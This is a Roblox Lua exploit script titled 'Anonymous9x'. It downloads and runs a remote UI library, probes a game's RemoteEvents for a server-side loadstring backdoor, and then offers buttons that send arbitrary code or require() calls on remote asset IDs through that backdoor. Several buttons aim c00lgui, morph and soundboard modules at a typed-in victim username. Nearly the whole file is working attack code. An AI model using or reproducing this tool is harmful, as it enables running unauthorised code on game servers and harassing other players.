local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Anonymous9x",
    LoadingTitle = "Anonymous9x",
    LoadingSubtitle = "by Anonymous9x",
    ConfigurationSaving = {
        Enabled = false,
    },
    Discord = {
        Enabled = false,
    },
    KeySystem = false,
})
local Tab = Window:CreateTab("Backdoor", 4483362458)

-- Variables
local backdoorRemote = nil
local statusLabel = nil

-- Test code template
local function getTestCode(attrName)
    return [[
        game:GetService("ReplicatedStorage"):SetAttribute("]] .. attrName .. [[", "SUCCESS")
    ]]
end

-- Scan & Test for the exact backdoor
local function scanAndTestBackdoors()
    local remotes = {}
    for _, child in ipairs(game.ReplicatedStorage:GetChildren()) do
        if child:IsA("RemoteEvent") then
            table.insert(remotes, child)
        end
    end

    if #remotes == 0 then
        Rayfield:Notify({
            Title = "â�Œ REM not found",
            Content = "No backdoor detected",
            Duration = 6
        })
        if statusLabel then
            statusLabel:Set("Backdoor Status: â�Œ No REM")
        end
        backdoorRemote = nil
        return
    end

    Rayfield:Notify({
        Title = "ðŸ”� Testing...",
        Content = "Testing " .. #remotes .. " RemoteEvent(s)...",
        Duration = 4
    })

    local workingRemotes = {}
    for _, remote in ipairs(remotes) do
        local attrName = "GrokBDTest_" .. remote.Name .. "_" .. math.random(100000, 999999)
        local testCode = getTestCode(attrName)
        local success, err = pcall(function()
            remote:FireServer(testCode)
        end)
        if not success then
            continue
        end
        task.wait(0.4)
        if game.ReplicatedStorage:GetAttribute(attrName) == "SUCCESS" then
            table.insert(workingRemotes, remote)
            pcall(function()
                remote:FireServer([[
                    game:GetService("ReplicatedStorage"):SetAttribute("]] .. attrName .. [[", nil)
                ]])
            end)
        end
    end

    if #workingRemotes > 0 then
        backdoorRemote = workingRemotes[1]
        local name = backdoorRemote.Name ~= "RemoteEvent" and backdoorRemote.Name or "Unnamed"
        if statusLabel then
            statusLabel:Set("âœ… Backdoor Found â†’ " .. name)
        end
        Rayfield:Notify({
            Title = "âœ… BACKDOOR DETECTED!",
            Content = "Loadstring backdoor confirmed! You can now run anything.",
            Duration = 6,
        })
    else
        backdoorRemote = nil
        if statusLabel then
            statusLabel:Set("â�Œ No Backdoor Found")
        end
        Rayfield:Notify({
            Title = "â�Œ No Backdoor",
            Content = "Cannot execute scripts.",
            Duration = 5
        })
    end
end

-- Status
statusLabel = Tab:CreateLabel("Backdoor Status: Not Tested Yet")

-- Scan button
Tab:CreateButton({
    Name = "ðŸ”� Scan & Test for Backdoor",
    Callback = function()
        scanAndTestBackdoors()
    end,
})

Tab:CreateSection("Backdoor Executor")

local codeInput = Tab:CreateInput({
    Name = "Code to Execute",
    PlaceholderText = "print('hi') or require(123456)()",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

Tab:CreateButton({
    Name = "ðŸš€ Execute Code via Backdoor",
    Callback = function()
        if not backdoorRemote then
            Rayfield:Notify({
                Title = "â�Œ Cannot Run",
                Content = "No backdoor detected. Scan first.",
                Duration = 5
            })
            return
        end
        local code = codeInput.CurrentValue
        if code == "" then return end
        pcall(function()
            backdoorRemote:FireServer(code)
        end)
        Rayfield:Notify({
            Title = "âœ… Executed",
            Content = "Server Pinged.",
            Duration = 3
        })
    end,
})

Tab:CreateSection("Quick Require")

local requireInput = Tab:CreateInput({
    Name = "Module Asset ID",
    PlaceholderText = "1234567890",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

Tab:CreateButton({
    Name = "ðŸ“¦ Run Module(ID)()",
    Callback = function()
        if not backdoorRemote then
            Rayfield:Notify({
                Title = "â�Œ Cannot Run",
                Content = "No backdoor detected. Scan first.",
                Duration = 5
            })
            return
        end
        local id = tonumber(requireInput.CurrentValue)
        if not id then return end
        pcall(function()
            backdoorRemote:FireServer("require(" .. id .. ")()")
        end)
        Rayfield:Notify({
            Title = "âœ… Require Sent",
            Content = "require(" .. id .. ")() fired.",
            Duration = 4
        })
    end,
})

Tab:CreateSection("c00lgui Executor")

local c00lTargetInput = Tab:CreateInput({
    Name = "Target Username",
    PlaceholderText = "puttheiruser",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

Tab:CreateButton({
    Name = "ðŸš€ Fire c00lgui (c00lkidd mode)",
    Callback = function()
        if not backdoorRemote then
            Rayfield:Notify({
                Title = "â�Œ No Backdoor",
                Content = "Scan first",
                Duration = 5
            })
            return
        end
        local target = c00lTargetInput.CurrentValue
        if target == "" then return end
        local code = 'require(14125553864):Fire("' .. target .. '", "c00lkidd")'
        pcall(function()
            backdoorRemote:FireServer(code)
        end)
        Rayfield:Notify({
            Title = "âœ… c00lgui Sent (Server)",
            Content = "Target: " .. target,
            Duration = 4
        })
    end,
})

Tab:CreateSection("MorphMonster Executor")

local morphTargetInput = Tab:CreateInput({
    Name = "Target Username",
    PlaceholderText = "TheirUser",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

Tab:CreateButton({
    Name = "ðŸ�± MorphMonster (Catnap)",
    Callback = function()
        if not backdoorRemote then
            Rayfield:Notify({
                Title = "â�Œ No Backdoor",
                Content = "Scan first",
                Duration = 5
            })
            return
        end
        local target = morphTargetInput.CurrentValue
        if target == "" then return end
        local code = 'require(92610899059557).MorphMonster("' .. target .. '", "catnap")'
        pcall(function()
            backdoorRemote:FireServer(code)
        end)
        Rayfield:Notify({
            Title = "âœ… Catnap Sent (Server)",
            Content = "Catnap on " .. target,
            Duration = 4
        })
    end,
})

Tab:CreateSection("Senstation Executor")

local happyTargetInput = Tab:CreateInput({
    Name = "Target Username",
    PlaceholderText = "TheirUser",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

Tab:CreateButton({
    Name = "Semstation",
    Callback = function()
        if not backdoorRemote then
            Rayfield:Notify({
                Title = "â�Œ No Backdoor",
                Content = "Scan first",
                Duration = 5
            })
            return
        end
        local target = happyTargetInput.CurrentValue
        if target == "" then return end
        local code = 'require(100263845596551)("' .. target .. '")'
        pcall(function()
            backdoorRemote:FireServer(code)
        end)
        Rayfield:Notify({
            Title = "âœ… HappyHub Sent (Server)",
            Content = "HappyHub on " .. target,
            Duration = 4
        })
    end,
})

Tab:CreateSection("Prototype Morph")

local prototypeTargetInput = Tab:CreateInput({
    Name = "Target Username",
    PlaceholderText = "TheirUser",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

Tab:CreateButton({
    Name = "ðŸ§¬ Prototype Morph (Server)",
    Callback = function()
        if not backdoorRemote then
            Rayfield:Notify({
                Title = "â�Œ No Backdoor",
                Content = "Scan first",
                Duration = 5
            })
            return
        end
        local target = prototypeTargetInput.CurrentValue
        if target == "" then return end
        local code = 'require(73755486018996).MorphMonster("' .. target .. '", "Prototype")'
        pcall(function()
            backdoorRemote:FireServer(code)
        end)
        Rayfield:Notify({
            Title = "âœ… Prototype Sent (Server)",
            Content = "Prototype on " .. target,
            Duration = 4
        })
    end,
})

Tab:CreateSection("Shin Sonic Morph")

local shinSonicTargetInput = Tab:CreateInput({
    Name = "Target Username",
    PlaceholderText = "TheirUser",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

Tab:CreateButton({
    Name = "ðŸŒŸ Shin Sonic (Server)",
    Callback = function()
        if not backdoorRemote then
            Rayfield:Notify({
                Title = "â�Œ No Backdoor",
                Content = "Scan first",
                Duration = 5
            })
            return
        end
        local target = shinSonicTargetInput.CurrentValue
        if target == "" then return end
        local code = 'require(77055143496081).MorphMonster("' .. target .. '", "sonic.eyx")'
        pcall(function()
            backdoorRemote:FireServer(code)
        end)
        Rayfield:Notify({
            Title = "âœ… Shin Sonic Sent (Server)",
            Content = "Shin Sonic on " .. target,
            Duration = 4
        })
    end,
})

Tab:CreateSection("Soundboard")

local soundboardTargetInput = Tab:CreateInput({
    Name = "Target Username",
    PlaceholderText = "TheirUser",
    RemoveTextAfterFocusLost = false,
    Callback = function() end,
})

Tab:CreateButton({
    Name = "ðŸ”Š Soundboard (Server)",
    Callback = function()
        if not backdoorRemote then
            Rayfield:Notify({
                Title = "â�Œ No Backdoor",
                Content = "Scan first",
                Duration = 5
            })
            return
        end
        local target = soundboardTargetInput.CurrentValue
        if target == "" then return end
        local code = 'require(80044428903741).soundboard("' .. target .. '")'
        pcall(function()
            backdoorRemote:FireServer(code)
        end)
        Rayfield:Notify({
            Title = "âœ… Soundboard Sent (Server)",
            Content = "Soundboard on " .. target,
            Duration = 4
        })
    end,
})
